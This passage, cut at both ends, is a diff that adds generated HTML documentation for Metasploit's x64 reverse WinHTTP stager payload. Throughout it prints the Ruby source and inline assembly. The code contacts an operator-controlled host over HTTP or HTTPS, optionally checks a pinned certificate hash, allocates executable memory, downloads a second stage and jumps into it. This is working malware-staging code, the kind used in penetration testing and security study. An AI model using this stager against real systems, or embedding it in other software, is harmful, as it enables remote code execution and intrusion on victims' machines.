+      mov [rdi], rax                ; set dwAccessType (3=WINHTTP_ACCESS_TYPE_NAMED_PROXY)
+
+      ; fallthrough to set the ie proxy
+
+    set_ie_proxy:
+      ; we assume that rdi is going to point to the proxy options
+      mov r8, rdi                   ; lpBuffer (proxy options)
+      push 24
+      pop r9                        ; dwBufferLength (size of proxy options)
+      mov rcx, rsi                  ; hConnection (connection handle)
+      push 38
+      pop rdx                       ; (38=WINHTTP_OPTION_PROXY)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpSetOption</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpSetOption
+      call rbp
+
+    ie_proxy_setup_finish:
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_retry_count'>retry_count</span> <span class='op'>&gt;</span> <span class='int'>1</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_retry_count'>retry_count</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      pop rdi
+
+    retryrequest:
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    winhttpsetoption_ssl:
+      mov rcx, rsi                  ; hRequest (request handle)
+      push 31
+      pop rdx                       ; dwOption (31=WINHTTP_OPTION_SECURITY_FLAGS)
+      push rdx                      ; stack alignment
+      push </span><span class='embexpr_beg'>#{</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%.8x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_secure_flags'>secure_flags</span><span class='embexpr_end'>}</span><span class='tstring_content'>  ; flags
+      mov r8, rsp                   ; lpBuffer (pointer to flags)
+      push 4
+      pop r9                        ; dwBufferLength (4 = size of flags)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpSetOption</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpSetOption
+      call rbp
+
+      xor r8, r8                    ; dwHeadersLen (0)
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_custom_headers'>custom_headers</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      call get_req_headers          ; lpszHeaders (pointer to the custom headers)
+      db </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_custom_headers'>custom_headers</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    get_req_headers:
+      pop rdx                       ; lpszHeaders
+      dec r8                        ; dwHeadersLength (assume NULL terminated)
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      push rbx
+      pop rdx                       ; lpszHeaders (NULL)
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      mov rcx, rsi                  ; hRequest (request handle)
+      xor r9, r9                    ; lpszVersion (NULL)
+      push rbx                      ; stack alignment
+      push rbx                      ; dwContext (0)
+      push rbx                      ; dwTotalLength (0)
+      push rbx                      ; dwOptionalLength (0)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpSendRequest</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpSendRequest
+      call rbp
+      test eax, eax
+      jnz handle_response
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_retry_count'>retry_count</span> <span class='op'>&gt;</span> <span class='int'>1</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    try_it_again:
+      dec rdi
+      jz failure
+      jmp retryrequest
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      jmp failure
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    failure:
+      call exitfunk
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    failure:
+      ; hard-coded to ExitProcess(whatever) for size
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ExitProcess</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                      ; ExitProcess(whatever)
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    handle_response:
+      mov rcx, rsi                  ; hRequest
+      push rbx
+      pop rdx                       ; lpReserved (NULL)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpReceiveResponse</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpReceiveResponse
+      call rbp
+      test eax, eax                 ; make sure the request succeeds
+      jz failure
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_verify_ssl'>verify_ssl</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    ssl_cert_get_context:
+      mov rcx, rsi                  ; Request handle (hInternet)
+      push 78                       ; WINHTTP_OPTION_SERVER_CERT_CONTEXT
+      pop rdx                       ; (dwOption)
+      ; Thanks to things that are on the stack from previous calls, we don&#39;t need to
+      ; worry about adding something to the stack to have space for the cert pointer,
+      ; so we won&#39;t worry about doing it, it&#39;ll save us bytes!
+      mov r8, rsp                   ; Stack pointer (lpBuffer)
+      mov r14, r8                   ; Back the stack pointer up for later use
+      push rbx                      ; 0 for alignment
+      push 8                        ; One whole pointer
+      mov r9, rsp                   ; Stack pointer (lpdwBufferLength)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpQueryOption</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp
+      test eax, eax                 ; use eax instead of rax, saves a byte
+      jz failure                    ; Bail out if we couldn&#39;t get the certificate context
+
+    ssl_cert_get_server_hash:
+      mov rcx, [r14]                ; Cert context pointer (pCertContext)
+      push 24                       ; sha1 length, rounded to multiple of 8
+      mov r9, rsp                   ; Address of length (pcbData)
+      mov r15, rsp                  ; Backup address of length
+      sub rsp, [r9]                 ; Allocate 20 bytes for the hash output
+      mov r8, rsp                   ; 20 byte buffer (pvData)
+      mov r14, r8                   ; Back the stack pointer up for later use
+      push 3
+      pop rdx                       ; CERT_SHA1_HASH_PROP_ID (dwPropId)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>crypt32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CertGetCertificateContextProperty</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp
+      test eax, eax                 ; use eax instead of rax, saves a byte
+      jz failure                    ; Bail out if we couldn&#39;t get the certificate context
+
+    ssl_cert_start_verify:
+      call ssl_cert_compare_hashes
+      db </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_cert_hash'>encoded_cert_hash</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    ssl_cert_compare_hashes:
+      pop rax                       ; get the expected hash
+      xchg rax, rsi                 ; swap hash and handle for now
+      mov rdi, r14                  ; pointer to the retrieved hash
+      mov rcx, [r15]                ; number of bytes to compare
+      repe cmpsb                    ; do the hash comparison
+      jnz failure                   ; Bail out if the result isn&#39;t zero
+      xchg rax, rsi                 ; swap hash and handle back!
+
+    ; Our certificate hash was valid, hurray!
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    allocate_memory:
+      push rbx
+      pop rcx                       ; lpAddress (NULL)
+      push 0x40
+      pop rdx
+      mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
+      shl edx, 16                   ; dwSize
+      mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>VirtualAlloc</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; VirtualAlloc
+      call rbp
+
+    download_prep:
+      xchg rax, rbx                 ; store the allocated base in rbx
+      push rbx                      ; store a copy for later
+      push rbx                      ; temp storage for byte count
+      mov rdi, rsp                  ; rdi is the &amp;bytesRead
+
+    download_more:
+      mov rcx, rsi                  ; hRequest (request handle)
+      mov rdx, rbx                  ; lpBuffer (pointer to mem)
+      mov r8, 8192                  ; dwNumberOfBytesToRead (8k)
+      mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpReadData</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpReadData
+      call rbp
+      add rsp, 32                   ; clean up reserved space
+
+      test eax, eax                 ; did the download fail?
+      jz failure
+
+      mov ax, word ptr [rdi]        ; extract the read byte count
+      add rbx, rax                  ; buffer += bytes read
+
+      test eax, eax                 ; are we done?
+      jnz download_more             ; keep going
+      pop rax                       ; clear up reserved space
+
+    execute_stage:
+      ret                           ; return to the stored stage address
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_exitfunk'>asm_exitfunk</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate-instance_method">
+  
+    #<strong>generate</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate the first stage</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_win_http_x64.rb', line 29</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_ds'>ds</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:datastore</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_datastore'>datastore</span>
+  <span class='id identifier rubyid_conf'>conf</span> <span class='op'>=</span> <span class='lbrace'>{</span>
+    <span class='label'>ssl:</span>  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='kw'>false</span><span class='comma'>,</span>
+    <span class='label'>host:</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>127.127.127.127</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+    <span class='label'>port:</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='rbrace'>}</span>
+
+  <span class='comment'># Add extra options if we have enough space
+</span>  <span class='kw'>if</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_available_space'>available_space</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span> <span class='op'>||</span> <span class='id identifier rubyid_required_space'>required_space</span> <span class='op'>&lt;=</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_available_space'>available_space</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:uri</span><span class='rbracket'>]</span>              <span class='op'>=</span> <span class='id identifier rubyid_luri'>luri</span> <span class='op'>+</span> <span class='id identifier rubyid_generate_uri'>generate_uri</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>         <span class='op'>=</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>EXITFUNC</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:verify_cert_hash</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:verify_cert_hash</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:proxy_host</span><span class='rbracket'>]</span>       <span class='op'>=</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyHost</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:proxy_port</span><span class='rbracket'>]</span>       <span class='op'>=</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyPort</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:proxy_user</span><span class='rbracket'>]</span>       <span class='op'>=</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyUser</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:proxy_pass</span><span class='rbracket'>]</span>       <span class='op'>=</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyPass</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:proxy_type</span><span class='rbracket'>]</span>       <span class='op'>=</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyType</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:retry_count</span><span class='rbracket'>]</span>      <span class='op'>=</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>StagerRetryCount</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:proxy_ie</span><span class='rbracket'>]</span>         <span class='op'>=</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyIE</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:custom_headers</span><span class='rbracket'>]</span>   <span class='op'>=</span> <span class='id identifier rubyid_get_custom_headers'>get_custom_headers</span><span class='lparen'>(</span><span class='id identifier rubyid_ds'>ds</span><span class='rparen'>)</span>
+  <span class='kw'>else</span>
+    <span class='comment'># Otherwise default to small URIs
+</span>    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:uri</span><span class='rbracket'>]</span>              <span class='op'>=</span> <span class='id identifier rubyid_luri'>luri</span> <span class='op'>+</span> <span class='id identifier rubyid_generate_small_uri'>generate_small_uri</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_generate_reverse_winhttp'>generate_reverse_winhttp</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_reverse_winhttp-instance_method">
+  
+    #<strong>generate_reverse_winhttp</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate and compile the stager</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_win_http_x64.rb', line 65</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_reverse_winhttp'>generate_reverse_winhttp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_combined_asm'>combined_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    cld                 ; Clear the direction flag.
+    and rsp, ~0xf       ; Ensure RSP is 16 byte aligned
+    call start          ; Call start, this pushes the address of &#39;api_call&#39; onto the stack.
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_block_api'>asm_block_api</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    start:
+      pop rbp           ; rbp now contains the block API pointer
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_reverse_winhttp'>asm_reverse_winhttp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  </span><span class='tstring_end'>^</span></span>
+  <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_combined_asm'>combined_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(*args)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Register reverse_winhttp specific options</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+19
+20
+21
+22
+23
+24</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_win_http_x64.rb', line 19</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='op'>*</span><span class='id identifier rubyid_args'>args</span><span class='rparen'>)</span>
+  <span class='kw'>super</span>
+  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span><span class='lbracket'>[</span>
+      <span class='const'><span class='object_link'><a href="../../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyIE</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Enable use of IE proxy settings</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='label'>default:</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='label'>aliases:</span> <span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PayloadProxyIE</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_class'>class</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="required_space-instance_method">
+  
+    #<strong>required_space</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Determine the maximum amount of space required for the features requested</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_win_http_x64.rb', line 81</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_required_space'>required_space</span>
+  <span class='comment'># Start with our cached default generated size
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>=</span> <span class='id identifier rubyid_cached_size'>cached_size</span>
+
+  <span class='comment'># Add 100 bytes for the encoder to have some room
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>100</span>
+
+  <span class='comment'># Make room for the maximum possible URL length (wchars)
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>512</span> <span class='op'>*</span> <span class='int'>2</span>
+
+  <span class='comment'># proxy (wchars)
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>128</span> <span class='op'>*</span> <span class='int'>2</span>
+
+  <span class='comment'># EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>31</span>
+
+  <span class='comment'># Custom headers? Ugh, impossible to tell
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>512</span>
+
+  <span class='comment'># The final estimated size
+</span>  <span class='id identifier rubyid_space'>space</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="transport_config-instance_method">
+  
+    #<strong>transport_config</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+58
+59
+60</pre>
+    </td>
+    <td>
